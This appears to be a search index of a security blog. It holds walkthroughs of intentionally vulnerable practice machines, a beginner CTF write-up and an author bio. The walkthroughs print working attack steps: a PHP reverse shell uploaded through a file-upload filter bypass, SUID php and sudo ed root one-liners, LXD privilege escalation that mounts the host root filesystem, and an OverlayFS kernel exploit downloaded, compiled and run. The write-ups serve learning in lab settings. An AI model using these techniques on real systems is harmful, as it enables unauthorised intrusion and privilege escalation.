[{"content":"\rJavascript needs to be enabled to decrypt content\rThis is a fun box where we have to exploit an authenticated file upload vulnerability to get a shell on the machine. The credentials for the authentication to the Koken CMS is revealed in an open file share. The escalation is also a simple SUID which can be easily found on GTFObins.\nInitially we are dropped into a Network 192.168.43.0/24 we start off with host discovery using arp-scan\nWe verify the results using nmap\nSo, we have identified our target as 192.168.43.184\nInitial Foothold At first let\u0026rsquo;s try to enumerate the machine for all the running services and then ennumerate accordingly.\nNmap Our nmap scan shows that we have four ports open 80, 139, 445 and 8000. So, there are two websites running and samba file share running.\n1 2 3 4 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) 139/tcp open netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 8000/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) SMB Lets start by enumerating the SMB service first to see if we have null authentication enabled which indeed we do and hence we have access to an internal fileshare due to some misconfigurations. So, Trying Null Authentication\nWe have downloaded two files here a mailsent.txt and a wordpress.bkp.zip. This clearly hints that the sambashare should have been internal but, it is open due to some misconfiguration.\n1 2 3 4 smbclient –N –L \\\\\\\\10.0.2.20 smbclient \\\\\\\\10.0.2.20\\\\sambashare get mailsent.txt get wordpress.bkp.zip Nothing much userful,but we have maybe some useful information inside this message.\nWeb Enumeration - Port 80,8000 On navigating to Port 80 we see a normal webpage with no critical info.\nRunning gobuster on the target, we get nothing userful except for the following images and assets directory.\nOn navigating to port 8000 we immediately see that this website is built using KokenCMS. So, exploits for this CMS might be available on exploitDB\nKoken CMS Exploit Exploit DB has an Arbitary File Upload (Authenticated) by box author which we came across while using searchsploit. But, for this we need to login to the admin Panel of KokenCMS\nAdmin Panel KokenCMS on url: http://192.168.43.184:8000/admin/\nNow, Let\u0026rsquo;s use the credentials discovered in the mailsent.txt. These credentials would help us authenticate as web-admin.\n1 daisa@photographer.com : babygirl We will follow the exploit instructions as given on the exploitDB page post authentication.\nUsing Default Php Reverse shell by pentest monkey by changing the hostname and the port and adding an extension of .jpg to bypass the filter.\nFinally renaming the file to shell.php inside Burpsuite\nOn our host machine we start netcat listner on port 4444 to listen for connect backs. And we click on our uploaded shell.php on our website. This gives us shell as www-data\nWe are also able to read the user flag.\nEscalation Finding setuid binary on the system we come up with the following results.\n1 find / -perm -u=s -type f 2\u0026gt; /dev/null We found out that /usr/bin/php7.2 has suid bit set which can be of some help to us and looking at GTFObins We immediately get a one liner to get shell as root.\n1 /usr/bin/php7.2 -r \u0026#34;pcntl_exec(\u0026#39;/bin/bash\u0026#39;, [\u0026#39;-p\u0026#39;]);\u0026#34; PWNED! ","description":"","id":0,"section":"posts","tags":["Samba","gobuster","Koken CMS","PHP Reverse Shel","File Upload","GTFObins","PHP SUID"],"title":"Photographer 1","uri":"https://gr33nm0nk2802.github.io/posts/photographer1/"},{"content":"This is a fun box on tryhackme which can help us teach lxd privilege esclation and how to deal with ssh private keys. Initially we get an ssh private key and a wordlist which we can crack to get an initial shell on the system. Enumerating we find that we are a member of the lxd group which can help us in utilizing LXD privilege esclation.\nTarget: 10.10.8.161 Initial Foothold Nmap Initially scanning the host for all ports, we found two ports open, 22 and 80.\nNavigating to the Robots.txt has a secret /uploads/ folder where we find a secret dictionary file.\nWe download this password list onto our system as this might help in bruteforcing the ssh passowrd.\n1 wget http://10.10.8.161/uploads/dict.lst We also found the Username in source code of the homepage.\nMedusa (Failed!) So, Trying to bruteforce SSH for user john using the passlist. (Failed)\n1 medusa -u john -P dict.lst -h 10.10.8.161 -M ssh Gobuster Enumering for more hidden directories using Gobuster.\nFound a ssh Private key in /secretKey folder. Using john we can crack the passford for the Keyfile\nCracking key using John Getting the hash of ssh.\nCracking the password using john.\nLoggin using ssh-key and the password letmein as user john is successful.\nLets get the user flag.\nPrivilege Esclation Next ennumerating the box for more information. We found out we are member of the lxd group.\nLXD Privilege Esclation I had no idea of LXD esclation before so, I found this interesting article which explained it pretty well.\nLXD Esclation - Payloads All The Things\nFirstly on our attacker machine we build the lxd-alpine image and transfer it to our target using python web server.\n1 2 3 4 git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder sudo ./build-alpine python3 -m http.server On our target, we navigate to the /tmp folder, download the alpine archive from our attacker machine and use it to build an container mounting the root filesystem.\n1 2 3 4 5 6 7 8 9 cd /tmp wget http://10.17.11.129:8000/apline-v3.10-x86_64-20191008_1227.tar.gz lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage lxc image list lxc init myimage ignite -c security.privileged=true lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true lxc start ignite lxc exec ignite /bin/sh id PWNED! ","description":"","id":1,"section":"posts","tags":["john","ssh key","docker","lxd"],"title":"Gaming Server","uri":"https://gr33nm0nk2802.github.io/posts/gamingserver/"},{"content":"This is a rellay fun box aimed to teach port knocking. We portknock the box at three instance to get to the ssh port but, the shells aren\u0026rsquo;t stable TTY shells and we have to find our way in. Finally we exploit the OverlayFS exploit(CVE: 2015-1328) to gain root.\nInitial Foothold Host Discovery Initially we are dropped into a network containing the vulnerable host and we scan for our target on the\nNetwork: 192.168.43.0/24 Confirming our results with Nmap\nHost Scanning Next we start off by scanning the host for open ports we find an http server running on port 80\nOn opening this website in browser, we discover a link to download a Pcap file.\nPort Knocking Opening this pcap file in wireshark, we discover the Port Knocking Sequence of 7000 8000 and 9000. This Knocks open 8888\nConnecting to this port using netcat, we are told of a hidden directory\nVisiting this path on the website gives us a link to download another Pcap file.\nOpening this Pcap with wireshark, we found another hidden message in tcp stream\nGoogle translator helps us to decode this secret message\nThis message tells us to knock Port in sequence 1 3 3 7 This helps us in Knocking opens port 1337 . Connecting to port 1337 using netcat reveals another hidden directory.\nVisiting this directory on browser, it containing username of Beavis and ssh port opening sequence encrypted which I thought of initally as password.\nDecoding this messsage, we get the final port knocking sequence to open up ssh port 22 whein knocked in the order 8888 9999 7777 6666\nSSH port opened\nSSH onto the Machine While we try to ssh as the user Beavis we found the actual ssh credentials\n1 2 USERNAME: butthead PASSWORD: nachosrule But our shell is immediately exited when we login successfully. To solve this, we run the /bin/bash command followed by the ssh command. This gives us a shell on the box.\nEscalation Further Enumerating the box looking for any low hagning fruit or misxonfiguration doesnot help so, we try to look for kernel exploits. But, lets ennumerate the Host first.\nUsing Searchsploit to find desired exploit\nWe transfer the exploit 37292.c to our target using Python\n1 python3 -m http.server Compile the exploit on the target and exploit the system\n1 2 gcc 37292.c -o exploit -pthread ./exploit PWNED! ","description":"","id":2,"section":"posts","tags":["Port Knocking","Kernel Exploit","OverlayFS","CVE 2015 1328"],"title":"Fart Knocker","uri":"https://gr33nm0nk2802.github.io/posts/fartknocker/"},{"content":"This is a beginner friendly box aimed to teach some port knocking and some neat privilege esclation. Here, we have a single port open and connecting to this port gives the port sequence for port knocking.\nWe use these ports to open up the box and then obtain a shell. It also has some shell stabilizing tricks and finally, we exploit a binary to esclate our privileges as root.\nInitially, we are inside the network with the vulnerable host.\nNetwork: 192.168.43.0/24 Host Discovery Our arp-scan tells us that our vulnerable device has the IP address 192.168.43.95.\nLets verify with nmap\nNote: This box doesnot respond to ICMP echo requests but, closer inspection revealed a Port Unreachable message which means the host is unreachable on that port.\nInitial Foothold Scanning Scanning for all ports tells port 1337 open.\nConnecting to port 1337 tells us the ports for port knocking.\nAfter knocking the ports using knockd when I scan for the network, I find the port 22 and\n80 to be open. Let\u0026rsquo;s connect to it first.\nInformation Disclosure I found nothing on port 80 except for an image telling us to look deeper.\nDowloading this image and using strings gives us credentials. This might be helpful for SSH.\nDirectly logging in doesn\u0026rsquo;t seem to work. So I though may be the credentials are encrypted.\nCracking Indeed was reversed and encrypted in caeser cipher.\nSo, the username is Jason and the password is jB9jP2knf\nI did notice later during login that the actual username is jason so, my login attempts failed previously.\nEsclation Shell Escape We can see that we are in a Restricted shell.\nRead More here: https://null-byte.wonderhowto.com/how-to/escape-restricted-shell-environments-linux-0341685/\nhttps://oscpnotes.infosecsanyam.in/My_OSCP_Preparation_Notes--Enumeration--SSH--rbash_shell_esacping.html\nExploitation Looking for the kernel version, we see we are on kernel 3.2.0. Querying the exploitdb through the linux exploit suggester gives us 4 kernel exploits.\nWow we find dirty cow here. Though its an unintended way on this old box, using dirtycow gives initial access to root shell.\nPWNED! ","description":"","id":3,"section":"posts","tags":["Port Knocking","rot13","privilege esclation","dirtycow","CVE 2016 5195","bufferoverflow"],"title":"Knock Knock","uri":"https://gr33nm0nk2802.github.io/posts/knock-knock/"},{"content":"This is a fairly easy beginner friendly machine which can have some real life scenarios. Here, we have anonymous login enabled and we can download and read files. Here we have backup of the credentials. Also the passwords are faily simple so, we can crack them within few seconds using John. Finaly after getting a shell on the machine we can privesc to root due to some sudo misconfiguration.\nInitially we are inside the following network which has a vulnerable machine attached to it.\nNetwork: 192.168.43.0/24 Information Gathering I scanned the Network for all the machines on the network using arp-scan and nmap and came across the vulnerable vulnhub VM (sunset) having IP address 192.168.43.83\nAfter having identified the vulnerable target I went ahead to looked for services running and open ports on the machine and the service version running on them. Fortunately I found FTP server running on port 21 and a SSH service running on Port 22.\nI also decided to take a look at the version of ssh and ftp running though these rarely have exploit and the only way to attack ssh is by bruteforce.\nInformation Disclosure The next thing which I checked was if anonymous login was enabled on the machine and if we did have any read write access using anonymous login. Fortunately we were able to login anonymously. Upon login when I looked around and found some sort of backups accessible. So, I tried to get those backups onto my system and have a look at them.\nAfter downloading the backups, they appeared to be the sha512 hashed credentials of the users on the machine.\nCracking Hashes Then, I used JohnTheRipper to crack the password using rockyou.txt wordlist and was able to get to the credentials.\nI found the username to be sunset and password cheer14\nPost Exploitation Ennumeration Then I logged into the machine using ssh and looked for our current privilege level. Upon ennumerating I found that we may run sudo on /usr/bin/ed without any password.\nThen I looked around for the user flag and found the user.txt\nPrivilege Esclation Finally, I searched for ed on GTFObins\nHere, I found that I can use this with sudo to get privileged shell.\nSo, I ran\n1 2 sudo /usr/bin/ed !/bin/bash This gave me the root shell.\nFinally, I got the root flag and I was also able to see the content of the vulnerable services running. So, the sysadmin has shared the credentials on an FTP server but, unfortunately we were able to access the backups as anonymous login was enabled.\n**Moral: FTP services should restrict anonymous login and even if user can login anonymously admins must make sure which sensitive files should not be readable by anonymous user. This slight misconfiguration can lead to a big compromise of the entire network. **\n","description":"","id":4,"section":"posts","tags":["ftp","sudo","sha512","john","Privilege Esclation","gtfobins","ed"],"title":"Sunset 1","uri":"https://gr33nm0nk2802.github.io/posts/sunset1/"},{"content":"This is a short writeup for all the challenges of the VIITCTF V3 organized by the ACM Student Chapter of VIGNAN’s Institue of Information Technology.\nIntroduction This was a beginners level CTF and the challenges were mostly from OSINT, Crypto, Stego, Reverse.\nHere is an Image of my challenges dashboard. I was eventually able to upsolve all the challenges.\nLets take a look at all the challenges.\nTest Test : 0 Points This was a dummy challenge to keep a track of the total number of participants and also introduce them to the flag format VIITCTF{.*} Here we simply had to copy paste the flag to solve it.\nAnswer: VIITCTF{flag}\nOSINT This section had four challenges which is going to test our skills of source code inspection, Passive recon to gather user information, guessing common directories and looking through DNS records.\nFind Me : 5 Points In this challenge we are provided with the following url. Now, as the first hint of the challenge suggested don\u0026rsquo;t make comments on me. This generally refers to the bad practices where developers tend to leave their credentials or some private data in source code comments. So, I started with looking into the source code for any suspicious comments.\nSocialize : 5 Points In this question we are given no exact information but, the twitter handle of the user and the promt tells us that the users social media contains some juicy info which points out that there might be flag hidden somewhere on his social media accounts.\nWe begin by looking into his twitter account @deathflash1411 . Here we find a link to his website.\nOn visiting his website we can see all of his social links on the footer.\nI looked for all the available possibilities and finally found something useful on his instagram profile.\nAnswer : VIITCTF{Ez_Pz_R3c0n}\nRobots : 5 Points In this challenge we are given a link to the defmax.io website. As the challenge prompt and the question names had robots in it I clearly planned to look for the robots.txt file as this is one of the most common files used by web crawlers. It has the permissions for the web crawlers weather they should index a particular page on search results or not based on their user agents.\nFortunately upon visiting defmax.io/robots.txt I found the flag.\nAnswer: VIITCTF{robots_cant_but_you_can}\nRecon : 20 Points In this challenge we are provided with the link to defmax.io website and we are to find the IP address behind cloudflare.\nNow, at a first glance you may want to try to find out the IP by looking for the A records of the DNS or use some other tools to get an insight of all the records of the Domain like AAAA ,MX, NS, CNAME, TXT etc. but, I we can find no information here. Even the A records has got the IPv4 address.\nA short snap of the information retrived by using dig(Domain Information Gathering) tool is shown below.\nAs stated the IP clearly belongs to Cloudflare and its of no use. So, next I came across this amazing tool Censys.io. This tool help us in gathering information of host. It is a great tool to get an overview of the host just using the domain name.\nSo, searching for defmax.io on censys I found three IP addresses and the one which appears at the bottom is in fact the correct IP address. Which can be verified by manually visiting the Urls.\nAnswer: VIITCTF{13.127.33.132}\nCRYPTO Shift em up : 5 Points In this challenge we are provided with the following cipher CPPAJAM{jhlzhy_lyhzly} and the hint also tells us to keep shifting. This indicates that it might be related to caesar shift cipher. So, I pasted the cipher in Cyberchef and using the Rot13 decoder I kept incrementing untill I found the flag on shift 19.\nAnswer: VIITCTF{caesar_eraser}\nFcuk : 5 Points In this challenge as the name of the file and the challenge indicates, jsf.txt this is associated with the JSfuck esoteric programming language. It can also be guessed by the IIFE expression at the end of the message.\nSo, we use thid JSFuck decoder from dcode.fr\nPasting the cipher here and decoding gives us the flag.\nAnswer: VIITCTF{Sure}\nSquare : 10 Points This challenge involves the Polybius Square Cipher. To decode this we use this Polybius Square Cipher Dcoder-Cryptii\nSimply pasting the hash and allowing for foreign characters and decoding gives us the flag.\nAnswer: VIITCTF{hell0_w0rld}\nEmDeeFive : 15 Points This was a relatively difficult challenge which I was able to solve after the CTF got over.So, in this problem there are two things to note. First our wordlist must have flash in it. And Second, this is not a simple MD5 encoding which we can crack using John or Hashcat as the string has been MD5 hashed 5 times as 1st hint tells us.\nSo, I came across this amazing blog which describes this and also it has a mirror to original MDxfind as the original source seems missing.\nFirst we start off by generating the wordlist. I will be generating this using the rockyou.txt wordlist.\n1 2 echo \u0026#34;f8fafd37ba3389b7ef251b7f9fff27ad\u0026#34; \u0026gt; hash.txt cat /usr/share/wordlists/rockyou.txt | grep -i flash \u0026gt; wordlist.txt We will use this wordlist for the hash cracking.\n1 mdxfind.static -h MD5 -i 5 -f hash.txt wordlist.txt Here -h specifies the hashtype ,-i specifies the iterations and -f specifies the hashes file followed by the wordlist file\nAnswer: VIITCTF{iloveflash}\nStego Base : 5 Points In this question we are provided with some base32 encoded data as we can see below it has characters in the range of A-Z and 2-7.\nSo, we see try to decode it online on cyberchef using decode from base32 and the output is again base32 encoded so, decoding from base32 three times we finally get some RAW data which after some close inspection looks like a PNG image data due to PNG , IHDR and IEND strings in them.\nAlso an alternate way of this this can be using a base32 decoder offline.\n1 2 cat hash.txt | base32 -d | base32 -d | base32 -d \u0026gt; flag.png eog flag.png So, I downloaded the raw data and saved as PNG. This png gives us the flag.\nNode: While downloading the data save it as filename.png\nAnswer: VIITCTF{bas3_3m_4ll}\nSplit : 10 Points In this challenge we are given with chunks of QR code inside a zip file and we can simply use photoshop to allign the qr code using trial and error and finally we get this QR code.\nNext we can use a tool called zbarimg to read the contents of the qr from the terminal itself.\nAnswer: VIITCTF{place_me_right}\nReverse Pass : 10 Points In this challenge we are provided with a binary and we need to reverse it.\nNow There can be multiple ways of doing it and we can use various tools to reverse it, but the easiest of all is to reverse the source code using Ghidra or Radare2.\nSo, in this challenge we are to find the PIN of this binary. We start as usual with analysis and by using strings command to get all the printable ascii characters but, its of no use.\nSo, next we open the binary in Ghidra and instantly we get the PIN 0x583 or 1411 in numeric.\nAlso doing the same in Radare, analyzing the function, seeking to the main function and printing it gives the flag.\nHence using the PIN as 1411 we, get our flag.\nAnswer : VIITCTF{pwn_the_pin}\n","description":"","id":5,"section":"posts","tags":["OSINT","Crypto","Stego","Reverse","MDxfind","Censys.io","dig"],"title":"VIIT CTF V3 - 2021","uri":"https://gr33nm0nk2802.github.io/posts/viitctf/"},{"content":"Hi, everyone welcome to Monk Security. I am gr33nm0nk2802 an Infosec geek from India, mostly interested in Network Penetration Testing, Buffer Overflows and Malware Development. Also, in my free time I do freelance work for creating CTF Problems.\nThis is my infosec blog but, here you can find posts from a wide range of topics like CTF writeups, Vulnhub, Tryhackme and HackTheBox walkthroughs and also some other trending topics alongside Networking, Data Structures and Programming.\nFeel free to reach out to me. On my social links.\n","description":"An infosec researcher","id":6,"section":"","tags":null,"title":"About Me","uri":"https://gr33nm0nk2802.github.io/about/"}]